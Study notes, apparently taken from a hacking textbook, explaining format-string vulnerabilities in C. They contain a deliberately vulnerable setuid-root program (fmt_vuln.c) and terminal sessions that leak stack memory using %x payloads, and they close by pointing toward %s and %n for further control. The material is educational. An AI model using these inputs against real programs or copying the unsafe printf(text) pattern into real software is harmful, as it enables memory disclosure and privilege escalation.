Sometimes programmers use printf(string) instead of printf("%s", string) to point strings
Functionally, this works fine
The format function is passed the address of the string, as opposed to the address of a format stringm and it iterates through the string, printing each character
Both methods are shown:

fmt_vuln.c
__________________________________________________________________________________
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, *char argv[]) {
    char text[1024];
    static int test_val = -72;

    if(argc < 2) {
        printf("Usage: %s <text to print>\n", argv[0]);
        exit(0);
    }
    strcpy(text, argv[1]);

    printf("The right way to print user-controlled input:\n");
    printf("%s", text);

    printf("\nThe wrong way to print user-controlled input:\n");
    printf(text);

    printf("\n");

    // Debug output
    printf("[*] test_val @ 0x%08x = %d 0x%08x\n", &test_val, test_val, test_val);

    exit(0);
}
__________________________________________________________________________________

__________________________________________________________________________________
reader@hacking:~/booksrc $ gcc -o fmt_vuln fmt_vuln.c
reader@hacking:~/booksrc $ sudo chown root:root ./fmt_vuln
reader@hacking:~/booksrc $ sudo chmod u+s ./fmt_vuln
reader@hacking:~/booksrc $ ./fmt_vuln testing
The right way to print user-controlled input:
testing
The wrong way to print user-controlled input:
testing
[*] test_val @ 0x08049794 = -72 0xffffffb8
__________________________________________________________________________________

Both methods seem to work with the string testing
But what happens if the string contains a format parameter? The format function should try to evaluate the format parameter and access the appropriate function argument by adding to the frame pointer
But as we saw earlier, if the appropriate function argument isn't there, adding to the frame pointer will reference a piece of memory in a preceding stack frame
__________________________________________________________________________________
reader@hacking:~/booksrc $ ./fmt_vuln testing%x
The right way to print user-controlled input:
testing%x
The wrong way to print user-controlled input:
testingbffff3e0
[*] test_val @ 0x08049794 = -72 0xffffffb8
__________________________________________________________________________________

When the %x format parameter was used, the hexadecimal representation of a 4-byte word in the stack was printed
This process can be used repeatedly to examine stack memory
__________________________________________________________________________________
reader@hacking:~/booksrc $ ./fmt_vuln $(perl -e 'print "%08x."x40')
The right way to print user-controlled input:
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.
The wrong way to print user-controlled input:
bffff320.b7fe75fc.00000000.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.
[*] test_val @ 0x08049794 = -72 0xffffffb8
__________________________________________________________________________________

This is what the lower stack memroy looks like
Each 4-byte word is backward, due to the little-endian architecture
     The characters are stored as is(a single byte)
     But, we tell the program to view the characters as a 4-byte hexadecimal
     So, it will read the characters as an integer(4 bytes)
The bytes 0x25, 0x30, 0x38, 0x78 and 0x2e seem to be repeating a lot
__________________________________________________________________________________
reader@hacking:~/booksrc $ printf "\x25\x30\x38\x78\x2e\n"
%08x.
__________________________________________________________________________________

They're the memory for the format string itself
Because the format function will always be on the highest stack frame, as long as the format string has been stored anywhere on the stack, it will be located below the current frame pointer(at higher memory address)(in our case in the stack frame of main function)
This fact can be used to control arguments to the format function
It is particular useful if format parameters that pass by reference are used, such as %s or %n